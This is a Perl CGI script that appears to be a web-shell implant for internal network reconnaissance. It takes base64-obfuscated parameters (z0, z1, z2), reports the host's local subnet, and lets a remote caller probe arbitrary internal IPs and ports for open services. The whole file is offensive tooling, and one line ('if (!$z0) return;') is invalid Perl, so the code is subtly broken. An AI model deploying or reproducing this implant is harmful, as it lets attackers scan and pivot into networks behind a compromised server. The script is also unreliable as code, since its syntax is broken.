use strict;
use warnings;
use CGI;
use MIME::Base64;
use IO::Socket::INET;

sub get_network_subnet {
    my $subnet = "192.168.1";
    
    my $ip = '';
    if ($^O eq 'MSWin32') {
        my $output = `ipconfig`;
        if ($output =~ /IPv4 Address[\s\.:]+([0-9\.]+)/) {
            $ip = $1;
        }
    } else {
        my $output = `hostname -I 2>/dev/null` || `ip route get 1 2>/dev/null | grep -oP 'src \\K[^ ]+'`;
        if ($output =~ /([0-9\.]+)/) {
            $ip = $1;
        }
    }
    
    if ($ip && $ip ne '127.0.0.1' && $ip =~ /^(\d+)\.(\d+)\.(\d+)\.\d+$/) {
        $subnet = "$1.$2.$3";
    }
    return $subnet;
}

sub main {
    my $q = CGI->new;

    my $z0 = $q->param('z0') // '';
    if (!$z0)
        return;

    my $action = decode_base64($z0);

    if ($action eq "info") {
        my $subnet = get_network_subnet();
        print "{\"status\":\"success\",\"subnet\":\"$subnet\"}";
        return;
    }

    if ($action eq "check") {
        my $z1 = $q->param('z1') // '';
        my $z2 = $q->param('z2') // '';
        if (!$z1 || !$z2) {
            print "{\"open\":false}";
            return;
        }

        my $target_ip = decode_base64($z1);
        my $target_port = decode_base64($z2);

        if (!$target_ip || !$target_port || $target_port <= 0) {
            print "{\"open\":false}";
            return;
        }

        my $socket = IO::Socket::INET->new(
            PeerAddr => $target_ip,
            PeerPort => $target_port,
            Proto    => 'tcp',
            Timeout  => 1.5
        );

        if ($socket) {
            print "{\"open\":true,\"ip\":\"$target_ip\",\"port\":$target_port}";
            close($socket);
        } else {
            print "{\"open\":false}";
        }
        return;
    }
}

main();